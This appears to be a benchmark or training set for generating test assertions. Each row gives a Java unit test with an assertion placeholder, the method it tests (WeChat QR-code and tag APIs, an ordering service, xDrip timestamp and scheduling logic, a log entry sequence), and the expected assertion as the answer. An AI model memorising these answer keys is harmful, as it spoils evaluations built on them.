restTemplate.postForEntity(url, request, String.class); String body = responseEntity.getBody(); LoggerUtils.debug( ""创建一个临时二维码,eventKey:{},返回结果:{}"",eventKey, body);  TempQrCodeResponse response = JSONObject.parseObject(body, TempQrCodeResponse.class); if (!response.isSuccessful()){ throw new WeChatException(response); } return response; }"	"assertNotNull(""创建二维码返回结果不应为空"",qrcode)"
"createTempIdQrcodeTest() { long l = new Random().nextLong(); TempQrCodeResponse qrcode = qrcodeManager.createTempIdQrcode(l, 200L); Assert.""<AssertPlaceHolder>""; }
createTempIdQrcode(@NotNull(message = ""自定义的id不能为空"") Long id, @NotNull(message = ""自定义的过期时间不能为空"") @Max(value = 2592000,message = ""最大有效值不能超过2592000秒(30天)，超过会自动转换为2592000"") @Min(value = 60,message = ""最小有效值为60，小于60会自动转换为60"") Long expireSecond) throws WeChatException,ParamCheckException { String token = weChatTokenRepository.get(); String url = MessageFormat.format(UrlConstant.CREATE_QRCODE_URL, token); JSONObject object = new JSONObject(); object.put(""action_name"", ""QR_SCENE""); object.put(""expire_seconds"", expireSecond); JSONObject scene = new JSONObject(); scene.put(""scene_id"", id); JSONObject actionInfo = new JSONObject(); actionInfo.put(""scene"", scene); object.put(""action_info"", actionInfo);   String json = object.toJSONString(); HttpHeaders headers = new HttpHeaders(); headers.setContentType(MediaType.APPLICATION_JSON); HttpEntity<String> request = new HttpEntity<>(json, headers); ResponseEntity<String> responseEntity = restTemplate.postForEntity(url, request, String.class); String body = responseEntity.getBody(); LoggerUtils.debug( ""创建一个临时二维码,id:{},返回结果:{}"",id, body);  TempQrCodeResponse response = JSONObject.parseObject(body, TempQrCodeResponse.class); if (!response.isSuccessful()){ throw new WeChatException(response); } return response; }"	"assertNotNull(""创建二维码返回结果不应为空"",qrcode)"
"createStringQrcodeTest() { String uuid = UUID.randomUUID().toString(); QrCodeResponse qrcode = qrcodeManager.createStringQrcode(uuid); Assert.""<AssertPlaceHolder>""; }
createStringQrcode(@NotBlank(message = ""自定义的eventKey，不应该为空"") String eventKey) throws WeChatException,ParamCheckException{ String token = weChatTokenRepository.get(); String url = MessageFormat.format(UrlConstant.CREATE_QRCODE_URL, token); JSONObject object = new JSONObject(); object.put(""action_name"", ""QR_LIMIT_STR_SCENE""); JSONObject scene = new JSONObject(); scene.put(""scene_str"", eventKey); JSONObject actionInfo = new JSONObject(); actionInfo.put(""scene"", scene); object.put(""action_info"", actionInfo);  String json = object.toJSONString(); HttpHeaders headers = new HttpHeaders(); headers.setContentType(MediaType.APPLICATION_JSON); HttpEntity<String> request = new HttpEntity<>(json, headers); ResponseEntity<String> responseEntity = restTemplate.postForEntity(url, request, String.class); String body = responseEntity.getBody(); LoggerUtils.debug( ""创建一个永久二维码,eventKey:{},返回结果:{}"",eventKey, body);  QrCodeResponse response = JSONObject.parseObject(body, QrCodeResponse.class); if (!response.isSuccessful()){ throw new WeChatException(response); } return response; }"	"assertNotNull(""创建二维码返回结果不应为空"",qrcode)"
"createIdQrcodeTest() { long l = new Random().nextLong(); QrCodeResponse qrcode = qrcodeManager.createIdQrcode(l); Assert.""<AssertPlaceHolder>""; }
createIdQrcode(@NotNull(message = ""二维码id不能为空"") Long id) throws WeChatException, ParamCheckException { String token = weChatTokenRepository.get(); String url = MessageFormat.format(UrlConstant.CREATE_QRCODE_URL, token); JSONObject object = new JSONObject(); object.put(""action_name"", ""QR_LIMIT_SCENE""); JSONObject scene = new JSONObject(); scene.put(""scene_id"", id); JSONObject actionInfo = new JSONObject(); actionInfo.put(""scene"", scene); object.put(""action_info"", actionInfo);  String json = object.toJSONString(); HttpHeaders headers = new HttpHeaders(); headers.setContentType(MediaType.APPLICATION_JSON); HttpEntity<String> request = new HttpEntity<>(json, headers); ResponseEntity<String> responseEntity = restTemplate.postForEntity(url, request, String.class); String body = responseEntity.getBody(); LoggerUtils.debug( ""创建一个永久二维码,id:{},返回结果:{}"",id, body);  QrCodeResponse response = JSONObject.parseObject(body, QrCodeResponse.class); if (!response.isSuccessful()){ throw new WeChatException(response); } return response; }"	"assertNotNull(""创建二维码返回结果不应为空"",qrcode)"
"test_1_getTagTest() { List<Tag> tag = tagManager.getTag(); Assert.""<AssertPlaceHolder>""; }
getTag() throws WeChatException{ String url = MessageFormat.format(UrlConstant.GET_TAGS_URL, weChatTokenRepository.get()); LoggerUtils.debug(""获取公众号已创建的标签url:{}"",url); ResponseEntity<String> entity = restTemplate.getForEntity(url, String.class); String body = entity.getBody(); LoggerUtils.debug(""获取公众号已创建的标签应答结果:{}"",body);  WeChatResponse weChatResponse = JSONObject.parseObject(body, WeChatResponse.class); if (!weChatResponse.isSuccessful()) { throw new WeChatException(weChatResponse); } JSONObject response = JSONObject.parseObject(body); return response.getJSONArray(""tags"").toJavaList(Tag.class);  }"	"assertNotNull(""标签不应该为空"", tag)"
"test_2_batchTagging() { List<String> list = Collections.singletonList(openId); WeChatResponse weChatResponse = tagManager.batchTagging(list, TAG_ID); Assert.""<AssertPlaceHolder>""; }
batchTagging( @NotEmpty(message = ""用户id列表不能为空"") @Size(max = 50, message = ""每次传入的 openid 列表个数不能超过50个"") List<String> openIdList, @NotNull(message = ""标签id不能为空"") Integer tagId) throws WeChatException, ParamCheckException {  String url = MessageFormat.format(UrlConstant.USERS_BATCH_TAGGING_URL, weChatTokenRepository.get()); LoggerUtils.debug(""用户批量打标签url:{}"",url); JSONObject requestParam = new JSONObject(); requestParam.put(""openid_list"", openIdList); requestParam.put(""tagid"", tagId); HttpHeaders headers = new HttpHeaders(); headers.setContentType(MediaType.APPLICATION_JSON); String json = JSON.toJSONString(requestParam); HttpEntity<String> request = new HttpEntity<>(json, headers); ResponseEntity<String> responseEntity = restTemplate.postForEntity(url, request, String.class); String body = responseEntity.getBody(); LoggerUtils.debug(""用户批量打标签应答结果:{}"",body);  WeChatResponse response = JSONObject.parseObject(body, WeChatResponse.class); if (!response.isSuccessful()) { throw new WeChatException(response); } return response;  }"	"assertTrue(""批量打标签不应该失败"", weChatResponse.isSuccessful())"
"test_4_getUserTags() { List<Integer> tags = tagManager.getUserTags(openId); Assert.""<AssertPlaceHolder>""; }
getUserTags(String openId) throws WeChatException, ParamCheckException{ String url = MessageFormat.format(UrlConstant.GET_USER_TAG_URL, weChatTokenRepository.get()); LoggerUtils.debug(""获取用户身上的标签url:{}"",url); JSONObject requestParam = new JSONObject(); requestParam.put(""openid"", openId); HttpHeaders headers = new HttpHeaders(); headers.setContentType(MediaType.APPLICATION_JSON); String json = JSON.toJSONString(requestParam); HttpEntity<String> request = new HttpEntity<>(json, headers); ResponseEntity<String> responseEntity = restTemplate.postForEntity(url, request, String.class); String body = responseEntity.getBody(); LoggerUtils.debug(""获取用户身上的标签应答结果:{}"",body);  WeChatResponse response = JSONObject.parseObject(body, WeChatResponse.class); if (!response.isSuccessful()) { throw new WeChatException(response); } JSONObject responseObject = JSONObject.parseObject(body);  return responseObject.getJSONArray(""tagid_list"").toJavaList(Integer.class); }"	"assertFalse(""获取的用户标签数量，不应该为空"", CollectionUtils.isEmpty(tags))"
"test_5_updateTag() { WeChatResponse weChatResponse = tagManager.updateTag(TAG_ID, tagValue2); Assert.""<AssertPlaceHolder>""; }
updateTag(@NotNull(message = ""标签id不能为空"") Integer id, @NotBlank(message = ""标签名字不能为空"") @Size(max = 30, message = ""最大长度不能超过30个字符"") String tagValue) throws WeChatException, ParamCheckException { String url = MessageFormat.format(UrlConstant.UPDATE_TAGS_URL, weChatTokenRepository.get()); LoggerUtils.debug(""更新标签url:{}"",url); JSONObject requestParam = new JSONObject(); JSONObject param = new JSONObject(); param.put(""name"", tagValue); param.put(""id"", id); requestParam.put(""tag"", param); HttpHeaders headers = new HttpHeaders(); headers.setContentType(MediaType.APPLICATION_JSON); String json = JSON.toJSONString(requestParam); HttpEntity<String> request = new HttpEntity<>(json, headers); ResponseEntity<String> responseEntity = restTemplate.postForEntity(url, request, String.class); String body = responseEntity.getBody(); LoggerUtils.debug(""更新标签应答结果:{}"",body);  WeChatResponse response = JSONObject.parseObject(body, WeChatResponse.class); if (!response.isSuccessful()) { throw new WeChatException(response); } return response; }"	"assertTrue(""更新标签不应该失败"", weChatResponse.isSuccessful())"
"test_6_batchUnTagging() { List<String> list = Collections.singletonList(openId); WeChatResponse weChatResponse = tagManager.batchUnTagging(list, TAG_ID); Assert.""<AssertPlaceHolder>""; }
batchUnTagging( @NotEmpty(message = ""用户id列表不能为空"") @Size(max = 50, message = ""每次传入的 openid 列表个数不能超过50个"") List<String> openIdList, @NotNull(message = ""标签id不能为空"") Integer tagId) throws WeChatException, ParamCheckException {  String url = MessageFormat.format(UrlConstant.USERS_BATCH_UNTAGGING_URL, weChatTokenRepository.get()); LoggerUtils.debug(""批量取消用户标签url:{}"",url); JSONObject requestParam = new JSONObject(); requestParam.put(""openid_list"", openIdList); requestParam.put(""tagid"", tagId); HttpHeaders headers = new HttpHeaders(); headers.setContentType(MediaType.APPLICATION_JSON); String json = JSON.toJSONString(requestParam); HttpEntity<String> request = new HttpEntity<>(json, headers); ResponseEntity<String> responseEntity = restTemplate.postForEntity(url, request, String.class); String body = responseEntity.getBody(); LoggerUtils.debug(""批量取消用户标签应答结果:{}"",body);  WeChatResponse response = JSONObject.parseObject(body, WeChatResponse.class); if (!response.isSuccessful()) { throw new WeChatException(response); } return response;  }"	"assertTrue(""批量取消标签不应该失败"", weChatResponse.isSuccessful())"
"test_7_deleteTag() { WeChatResponse weChatResponse = tagManager.delete(TAG_ID); Assert.""<AssertPlaceHolder>""; }
delete( @NotNull(message = ""标签id不能为空"") Integer id) throws WeChatException, ParamCheckException { String url = MessageFormat.format(UrlConstant.DELETE_TAGS_URL, weChatTokenRepository.get()); LoggerUtils.debug(""删除标签url:{}"",url); JSONObject requestParam = new JSONObject(); JSONObject param = new JSONObject(); param.put(""id"", id); requestParam.put(""tag"", param); HttpHeaders headers = new HttpHeaders(); headers.setContentType(MediaType.APPLICATION_JSON); String json = JSON.toJSONString(requestParam); HttpEntity<String> request = new HttpEntity<>(json, headers); ResponseEntity<String> responseEntity = restTemplate.postForEntity(url, request, String.class); String body = responseEntity.getBody(); LoggerUtils.debug(""删除标签应答结果:{}"",body);  WeChatResponse response = JSONObject.parseObject(body, WeChatResponse.class);   if (!response.isSuccessful()) { throw new WeChatException(response); } return response; }"	"assertTrue(""删除标签不应该失败"", weChatResponse.isSuccessful())"
"findAllTest() { Set<String> all = userManager.findAll(); Assert.""<AssertPlaceHolder>""; }
findAll() throws WeChatException { Set<String> openIdSet = new HashSet<>();  int current = 0; int totle = 1; String nextOpenId = """"; while (current < totle) { String token = weChatTokenRepository.get();  String url = MessageFormat.format(UrlConstant.FIND_ALL_USER_OPENID, token, nextOpenId);  ResponseEntity<String> forEntity = restTemplate.getForEntity(url, String.class); String body = forEntity.getBody(); final JSONObject resultData = JSONObject.parseObject(body); if (resultData.getInteger(""errcode"") == null || resultData.getInteger(""errcode"") == 0) { totle = resultData.getInteger(""total""); current += resultData.getInteger(""count""); nextOpenId = resultData.getString(""next_openid"");  logger.info(""total:"" + totle + "",current:"" + current + "",nextId:"" + nextOpenId + "",size:"" + openIdSet.size());  JSONObject data = resultData.getJSONObject(""data""); if (Objects.nonNull(data)) { final JSONArray array = data.getJSONArray(""openid""); if (!CollectionUtils.isEmpty(array)) { array.forEach(o -> { openIdSet.add(o.toString()); }); } } } else { WeChatException weChatException = new WeChatException(""获取全部openId失败，微信返回值:"" + resultData.toJSONString()); weChatException.setErrorCode(resultData.getInteger(""errcode"")); throw weChatException; } } return openIdSet; }"	"assertFalse(""查询到的用户不应为空"", CollectionUtils.isEmpty(all))"
"getUserInfoTest() { SubscriptionResponse userInfo = userManager.getUserInfo(openId, LanguageEnum.ZH_CN); Assert.""<AssertPlaceHolder>""; }
getUserInfo(@NotBlank(message = ""待查询待openId不应为空"") String openId, @NotNull(message = ""语言选择不应为空"") LanguageEnum languageEnum) throws WeChatException, ParamCheckException { if (StringUtils.isBlank(openId)) { return null; } String token = weChatTokenRepository.get(); String url = MessageFormat.format(UrlConstant.ONE_USER_INFO_URL, token, openId, languageEnum.getCode()); ResponseEntity<JSONObject> forEntity = restTemplate.getForEntity(url, JSONObject.class); JSONObject body = forEntity.getBody();  SubscriptionResponse response = body.toJavaObject(SubscriptionResponse.class); if (!response.isSuccessful()) { throw new WeChatException(response); } return response; }"	"assertTrue(""查询到的用户信息不应为空"", Objects.nonNull(userInfo))"
"testUrlForText() { String result = UrlUtils.urlForText(mContext, text, mVisitor); ""<AssertPlaceHolder>""; }
urlForText(@NonNull Context context, @NonNull String text, @NonNull WSession.UrlUtilsVisitor visitor) { String url = text.trim(); URI uri; try { uri = parseUri(url); if (!uri.isAbsolute()) { if (!isDomain(url) && !isIPUri(url)) return searchURLForText(context, url); uri = parseUri(""http://"" + url); } // This catches the special case of passing an URL with an invalid IP address if (uri.getHost() == null && uri.getAuthority() != null) return searchURLForText(context, url); } catch (URISyntaxException e) { return searchURLForText(context, url); }  if (!isEngineSupportedScheme(uri, visitor)) { TelemetryService.urlBarEvent(false); return searchURLForText(context, url); }  TelemetryService.urlBarEvent(true); return uri.toString(); }"	assertEquals(expected, result)
"insertByMap() { Map<String,Object> category = new HashMap<>(); category.put(""categoryName"",""饮料""); category.put(""category_type"",new Integer(7)); int result = mapper.insertByMap(category); Assert.""<AssertPlaceHolder>""; }
insertByMap(Map<String, Object> map);  /** * 新增 * 通过对象注入 * @param productCategory * @return */ @Insert(""insert into product_category(category_name, category_type) values (#{categoryName, jdbcType=VARCHAR}"	assertEquals(1,result)
"insertByObject() { ProductCategory productCategory = new ProductCategory(); productCategory.setCategoryName(""西餐""); productCategory.setCategoryType(new Integer(7)); int result = mapper.insertByObject(productCategory); Assert.""<AssertPlaceHolder>""; }
insertByObject(ProductCategory productCategory);   /** * 查询，并指定要查询的字段 * */ @Select(""select * from product_category where category_type = #{categoryType}"	assertEquals(1,result)
"findByCategoryType() { ProductCategory result = mapper.findByCategoryType(new Integer(7)); Assert.""<AssertPlaceHolder>""; }
findByCategoryType(Integer categoryType);  /** * 查询，并指定要查询的字段 * @param categoryName * @return */ @Select(""select * from product_category where category_name = #{categoryName}"	assertNotNull(result)
"updateByCategoryType() { int result = mapper.updateByCategoryType(""清蒸"", 7); Assert.""<AssertPlaceHolder>""; }
updateByCategoryType(@Param(""categoryName"") String categoryName, @Param(""categoryType"") Integer categoryType);  /** * 通过对象更新 * @param productCategory * @return */ @Update(""update product_category set category_name = #{categoryName}"	assertEquals(1,result)
"selectByCategoryType() { ProductCategory productCategory = mapper.selectByCategoryType(7); Assert.""<AssertPlaceHolder>""; }
selectByCategoryType(Integer categoryType);"	assertNotNull(productCategory)
"updateCategoryType() { int result = productMapper.updateCategoryType(4, 2); //目前数据库表product_info表中有两个商品的categoryType等于2，所以返回的结果应该为2，表示成功更改了两条数据 Assert.""<AssertPlaceHolder>""; }
updateCategoryType(@Param(""originCategoryType"") Integer originCategoryType, @Param(""newCategoryType"") Integer newCategoryType);  /** * 利用数据库行锁减库存 * @param productQuantity * @param productId * @return */ @Update(""update product_info set product_stock = product_stock - #{productQuantity}"	assertEquals(2,result)
"findByOpenid() { SellerInfo result = repository.findByOpenid(""abc""); Assert.""<AssertPlaceHolder>""; }
findByOpenid(String openid);"	"assertEquals(""abc"",result.getOpenid())"
"Exception { ProductCategory productCategory = new ProductCategory(""男生专享"", 2); ProductCategory result = categoryService.save(productCategory); Assert.""<AssertPlaceHolder>""; }
save(ProductCategory productCategory) { return repository.save(productCategory); }"	assertNotNull(result)
"create() {  OrderDTO orderDTO = new OrderDTO(); orderDTO.setBuyerName(""张三""); orderDTO.setBuyerPhone(""15844003403""); orderDTO.setBuyerAddress(""并夕夕""); orderDTO.setBuyerOpenid(BUYER_OPENID);  //购物车,假设买了5个包子，10个油条 ArrayList<OrderDetail> orderDetailList = new ArrayList<>(); OrderDetail o1 = new OrderDetail(); o1.setProductId(""123457""); o1.setProductQuantity(5); orderDetailList.add(o1); OrderDetail o2 = new OrderDetail(); o1.setProductId(""123456""); o1.setProductQuantity(10); orderDetailList.add(o2);  orderDTO.setOrderDetailList(orderDetailList);  OrderDTO result = orderService.create(orderDTO); log.info(""【创建订单】result={}"",result); Assert.""<AssertPlaceHolder>""; }
create(OrderDTO orderDTO) {  //生成Order表主键 String orderId = KeyUtil.genUniqueKey(); BigDecimal orderAmount = new BigDecimal(BigInteger.ZERO);  //1.查询商品（数量，价格） for (OrderDetail orderDetail: orderDTO.getOrderDetailList()){ //商品的价格需要从数据库中获取 ProductInfo productInfo = productService.findOne(orderDetail.getProductId()); if (productInfo == null){ throw new SellException(ResultEnum.PRODUCT_NOT_EXIST); }  //2.计算总价（统一为BigDecimal类型进行计算） orderAmount = productInfo.getProductPrice() .multiply(new BigDecimal(orderDetail.getProductQuantity())) .add(orderAmount);  //3.订单详情入库 orderDetail.setDetailId(KeyUtil.genUniqueKey()); orderDetail.setOrderId(orderId); BeanUtils.copyProperties(productInfo,orderDetail); orderDetailRepository.save(orderDetail); }  //4.写入订单数据库 OrderMaster orderMaster = new OrderMaster(); //设置订单id orderDTO.setOrderId(orderId); BeanUtils.copyProperties(orderDTO,orderMaster); //写入总价 orderMaster.setOrderAmount(orderAmount); //写入订单状态 orderMaster.setOrderStatus(OrderStatusEnum.NEW.getCode()); //写入支付状态 orderMaster.setPayStatus(PayStatusEnum.WAIT.getCode()); orderMasterRepository.save(orderMaster);  //5.创建购物车（用于扣减库存） List<CartDTO> cartDTOList = orderDTO.getOrderDetailList().stream().map(e-> new CartDTO(e.getProductId(),e.getProductQuantity()) ).collect(Collectors.toList());  //6.扣减库存 productService.decreaseStock(cartDTOList);  //7.发送websocket消息 webSocket.sendMessage(""有新的饿了吗订单，请即时查收"");  return orderDTO; }"	assertNotNull(result)
"findOne() { OrderDTO result = orderService.findOne(ORDERID); log.info(""【查询单个订单】result={}"",result); Assert.""<AssertPlaceHolder>""; }
findOne(String orderId) { OrderMaster orderMaster = orderMasterRepository.findById(orderId).orElse(null); if (orderMaster == null){ throw new SellException(ResultEnum.ORDER_NOT_EXIST); }  List<OrderDetail> orderDetailList = orderDetailRepository.findByOrderId(orderId); if (CollectionUtils.isEmpty(orderDetailList)){ throw new SellException(ResultEnum.ORDER_DETAIL_NOT_EXIST); }  OrderDTO orderDTO = new OrderDTO(); BeanUtils.copyProperties(orderMaster,orderDTO); orderDTO.setOrderDetailList(orderDetailList);  return orderDTO; }"	assertNotNull(result)
"cancel() { OrderDTO orderDTO = orderService.findOne(ORDERID); OrderDTO result = orderService.cancel(orderDTO); Assert.""<AssertPlaceHolder>""; }
cancel(OrderDTO orderDTO) {  OrderMaster orderMaster = new OrderMaster();  //判断订单状态，如果不是新下单状态则报错 if (!orderDTO.getOrderStatus().equals(OrderStatusEnum.NEW.getCode())){ log.error(""【取消订单】订单状态不正确，orderId={},orderStatus={}"",orderDTO.getOrderId(),orderDTO.getOrderStatus()); throw new SellException(ResultEnum.ORDER_STATUS_ERROR); }  //修改订单状态 orderDTO.setOrderStatus(OrderStatusEnum.CANCEL.getCode()); BeanUtils.copyProperties(orderDTO,orderMaster); OrderMaster updateResult = orderMasterRepository.save(orderMaster); if (updateResult == null){ log.error(""【取消订单】更新失败，orderMaster={}"",orderMaster); throw new SellException(ResultEnum.ORDER_UPDATE_ERROR); }  //增加库存 if (CollectionUtils.isEmpty(orderDTO.getOrderDetailList())){ log.error(""【取消订单】订单中无商品详情，orderDTO={}"",orderDTO); throw new SellException(ResultEnum.ORDER_DETAIL_NOT_EXIST); } List<CartDTO> cartDTOList = orderDTO.getOrderDetailList().stream() .map(e -> new CartDTO(e.getProductId(), e.getProductQuantity())) .collect(Collectors.toList()); productService.increaseStock(cartDTOList);  //如果已经支付，需要退款 if (orderDTO.getPayStatus().equals(PayStatusEnum.SUCCESS.getCode())){ payService.refund(orderDTO); } return orderDTO; }"	assertEquals(OrderStatusEnum.CANCEL.getCode(),result.getOrderStatus())
"findOne() { ProductInfo product = productService.findOne(""123456""); Assert.""<AssertPlaceHolder>""; }
findOne(String productId) { return repository.findById(productId).orElse(null); }"	assertNotNull(product)
"save() { ProductInfo productInfo = new ProductInfo(); productInfo.setProductId(""123457""); productInfo.setProductName(""肉包子""); productInfo.setProductPrice(new BigDecimal(3.0)); productInfo.setProductStock(100); productInfo.setProductDescription(""刚蒸的包子""); productInfo.setProductIcon(""http://xxxx.jpg""); productInfo.setProductStatus(ProductStatusEnum.UP.getCode()); productInfo.setCategoryType(2);  ProductInfo result = productService.save(productInfo); Assert.""<AssertPlaceHolder>""; }
save(ProductInfo productInfo) { return repository.save(productInfo); }"	assertNotNull(result)
"getTimeStamp_notSet() { // :: Setup Entry entry = new Entry();  // :: Act long timeStamp = entry.getTimeStamp();  // :: Verify ""<AssertPlaceHolder>""; }
getTimeStamp() { if (date > 1000000) { return Math.round(date); } if (sysTime != null) { try { final Date date = DateUtil.tolerantFromISODateString(sysTime); return date.getTime(); } catch (Exception e) { // } } if (dateString != null) { try { final Date date = DateUtil.tolerantFromISODateString(dateString); return date.getTime(); } catch (Exception e) { // } } return -1; }"	assertThat(timeStamp).isEqualTo(-1)
"getTimeStamp_dateStringParser_Invalid() { // :: Setup Entry entry = new Entry(); entry.dateString = ""XXX"";  // :: Act long timeStamp = entry.getTimeStamp();  // :: Verify ""<AssertPlaceHolder>""; }
getTimeStamp() { if (date > 1000000) { return Math.round(date); } if (sysTime != null) { try { final Date date = DateUtil.tolerantFromISODateString(sysTime); return date.getTime(); } catch (Exception e) { // } } if (dateString != null) { try { final Date date = DateUtil.tolerantFromISODateString(dateString); return date.getTime(); } catch (Exception e) { // } } return -1; }"	assertThat(timeStamp).isEqualTo(-1)
"getTimeStamp_sysTimeParser_Invalid() { // :: Setup Entry entry = new Entry(); entry.sysTime = ""XXX"";  // :: Act long timeStamp = entry.getTimeStamp();  // :: Verify ""<AssertPlaceHolder>""; }
getTimeStamp() { if (date > 1000000) { return Math.round(date); } if (sysTime != null) { try { final Date date = DateUtil.tolerantFromISODateString(sysTime); return date.getTime(); } catch (Exception e) { // } } if (dateString != null) { try { final Date date = DateUtil.tolerantFromISODateString(dateString); return date.getTime(); } catch (Exception e) { // } } return -1; }"	assertThat(timeStamp).isEqualTo(-1)
"getTimestamp_date_low_aka_invalid() { // :: Setup Entry entry = new Entry(); entry.date = 10000;  // :: Act long timeStamp = entry.getTimeStamp();  // :: Verify ""<AssertPlaceHolder>""; }
getTimeStamp() { if (date > 1000000) { return Math.round(date); } if (sysTime != null) { try { final Date date = DateUtil.tolerantFromISODateString(sysTime); return date.getTime(); } catch (Exception e) { // } } if (dateString != null) { try { final Date date = DateUtil.tolerantFromISODateString(dateString); return date.getTime(); } catch (Exception e) { // } } return -1; }"	assertThat(timeStamp).isEqualTo(-1)
"getTimestamp_date_valid() { // :: Setup Entry entry = new Entry(); entry.date = 2000000; entry.sysTime = ""XXX""; entry.dateString = ""XXX"";  // :: Act long timeStamp = entry.getTimeStamp();  // :: Verify ""<AssertPlaceHolder>""; }
getTimeStamp() { if (date > 1000000) { return Math.round(date); } if (sysTime != null) { try { final Date date = DateUtil.tolerantFromISODateString(sysTime); return date.getTime(); } catch (Exception e) { // } } if (dateString != null) { try { final Date date = DateUtil.tolerantFromISODateString(dateString); return date.getTime(); } catch (Exception e) { // } } return -1; }"	assertThat(timeStamp).isEqualTo(2000000)
"next_simpleMode() { // :: Setup long now = 10_000; int period = 1_000; long last = now - 1_000; int grace = 5;  // :: Act long next = Anticipate.next(now, last, period, grace);  // :: Verify ""<AssertPlaceHolder>""; }
next(long now, final long last, final long period, final long grace) {  final long since = now - last; if (since <= (grace * 2)) { // recent reading already return last + period - grace; }  // Find time outside period schedule where we are now. final long modulus = (last - now) % period; long nextMin; // Try to wake up on next expected if (modulus < -grace) { nextMin = (now + modulus) + period - grace; } else { nextMin = (now + modulus); }  // Make sure result is after now. while (nextMin <= now) { nextMin += grace; }  return nextMin; }"	assertThat(next).isEqualTo(now + 5)
"next_lateCall() { // :: Setup long now = 10_000; long last = now - 5_000; int period = 1_000; int grace = 5;  // :: Act long next = Anticipate.next(now, last, period, grace);  // :: Verify ""<AssertPlaceHolder>""; }
next(long now, final long last, final long period, final long grace) {  final long since = now - last; if (since <= (grace * 2)) { // recent reading already return last + period - grace; }  // Find time outside period schedule where we are now. final long modulus = (last - now) % period; long nextMin; // Try to wake up on next expected if (modulus < -grace) { nextMin = (now + modulus) + period - grace; } else { nextMin = (now + modulus); }  // Make sure result is after now. while (nextMin <= now) { nextMin += grace; }  return nextMin; }"	assertThat(next).isEqualTo(now + 5)
"next_waitPeriod() { // :: Setup long now = 10_000; long last = now - 5; int period = 1_000; int grace = 5;  // :: Act long next = Anticipate.next(now, last, period, grace);  // :: Verify ""<AssertPlaceHolder>""; }
next(long now, final long last, final long period, final long grace) {  final long since = now - last; if (since <= (grace * 2)) { // recent reading already return last + period - grace; }  // Find time outside period schedule where we are now. final long modulus = (last - now) % period; long nextMin; // Try to wake up on next expected if (modulus < -grace) { nextMin = (now + modulus) + period - grace; } else { nextMin = (now + modulus); }  // Make sure result is after now. while (nextMin <= now) { nextMin += grace; }  return nextMin; }"	assertThat(next).isEqualTo(last + period - grace)
"next_waitPeriod2() { // :: Setup long now = 10_000; long last = now - 15; int period = 1_000; int grace = 5;  // :: Act long next = Anticipate.next(now, last, period, grace);  // :: Verify ""<AssertPlaceHolder>""; }
next(long now, final long last, final long period, final long grace) {  final long since = now - last; if (since <= (grace * 2)) { // recent reading already return last + period - grace; }  // Find time outside period schedule where we are now. final long modulus = (last - now) % period; long nextMin; // Try to wake up on next expected if (modulus < -grace) { nextMin = (now + modulus) + period - grace; } else { nextMin = (now + modulus); }  // Make sure result is after now. while (nextMin <= now) { nextMin += grace; }  return nextMin; }"	assertThat(next).isEqualTo(last + period - grace)
"next_realWorld1() { // :: Setup // 2019-06-38 11:18:49 long now = 1_561_893_529_622L; // 2019-06-30 11:13:29 long last = 1_561_893_209_000L; // 5 minutes long period = 300_000L; // 10 seconds long grace = 10_000;  // :: Act long next = Anticipate.next(now, last, period, grace);  // :: Verify // 2019-06-30 11:18:59 (now + grace) ""<AssertPlaceHolder>""; }
next(long now, final long last, final long period, final long grace) {  final long since = now - last; if (since <= (grace * 2)) { // recent reading already return last + period - grace; }  // Find time outside period schedule where we are now. final long modulus = (last - now) % period; long nextMin; // Try to wake up on next expected if (modulus < -grace) { nextMin = (now + modulus) + period - grace; } else { nextMin = (now + modulus); }  // Make sure result is after now. while (nextMin <= now) { nextMin += grace; }  return nextMin; }"	assertThat(next).isEqualTo(1_561_893_799_000L)
"ketoneTest() { ContextRx contextRx = new ContextRx(JoH.hexStringToByteArray(""02040006"")); ""<AssertPlaceHolder>""; }
ketone() { return mealType == 0x06; }"	assertTrue(contextRx.ketone())
"toStringTest() { ContextRx contextRx = new ContextRx(JoH.hexStringToByteArray(""02040006"")); ""<AssertPlaceHolder>""; }
toString() { return ""Context: "" + ""Sequence: "" + sequence + "" "" + (ketone() ? "" KETONE "" : """") + (hasSecondaryFlags ? "" SECONDARY FLAGS "" : """") + (hasMealType ? "" MEALTYPE: "" + mealType + "" "" : """") + (hasCarbInfo ? "" CARB INFO "" : """"); }"	"assertEquals(""Context: Sequence: 4  KETONE  MEALTYPE: 6 "", contextRx.toString())"
"getLastestNoneXdrip_noneEntered() { // :: Create long time = Instant.now().getEpochSecond(); Treatments.create(1, 8, time); Treatments.create(2, 7, time); Treatments.create(3, 6, time); Treatments.create(4, 5, time); Treatments.create(5, 4, time); Treatments.create(6, 3, time); Treatments.create(7, 2, time); Treatments.create(8, 1, time);  // :: Read Treatments lastTreatment = Treatments.lastNotFromXdrip();  // :: Verify ""<AssertPlaceHolder>""; }
lastNotFromXdrip() { fixUpTable(); return new Select() .from(Treatments.class) .where(""enteredBy NOT LIKE '"" + XDRIP_TAG + ""%'"") .orderBy(""_ID DESC"") .executeSingle(); }"	assertThat(lastTreatment).isNull()
"testGetLastEntryEmpty() { FileEntrySequence sequence = new FileEntrySequence(entriesFile, entryIndexFile, 1); Assert.""<AssertPlaceHolder>""; }
getLastEntry() { if (isEmpty()) { return null; } if (!pendingEntries.isEmpty()) { return pendingEntries.getLast(); } assert !entryIndexFile.isEmpty(); return getEntryInFile(entryIndexFile.getMaxEntryIndex()); }"	assertNull(sequence.getLastEntry())
"IOException { appendEntryToFile(new NoOpEntry(1, 1)); FileEntrySequence sequence = new FileEntrySequence(entriesFile, entryIndexFile, 1); Assert.""<AssertPlaceHolder>""; }
getLastEntry() { if (isEmpty()) { return null; } if (!pendingEntries.isEmpty()) { return pendingEntries.getLast(); } assert !entryIndexFile.isEmpty(); return getEntryInFile(entryIndexFile.getMaxEntryIndex()); }"	assertEquals(1, sequence.getLastEntry().getIndex())
"testGetLastEntryFromPendingEntries() { FileEntrySequence sequence = new FileEntrySequence(entriesFile, entryIndexFile, 1); sequence.append(new NoOpEntry(1, 1)); Assert.""<AssertPlaceHolder>""; }
getLastEntry() { if (isEmpty()) { return null; } if (!pendingEntries.isEmpty()) { return pendingEntries.getLast(); } assert !entryIndexFile.isEmpty(); return getEntryInFile(entryIndexFile.getMaxEntryIndex()); }"	assertEquals(1, sequence.getLastEntry().getIndex())
"IOException { EntryIndexFile file = new EntryIndexFile(new ByteArraySeekableFile()); Iterator<EntryIndexItem> iterator = file.iterator(); Assert.""<AssertPlaceHolder>""; }
hasNext() { checkModification(); return currentEntryIndex <= maxEntryIndex; }"	assertFalse(iterator.hasNext())
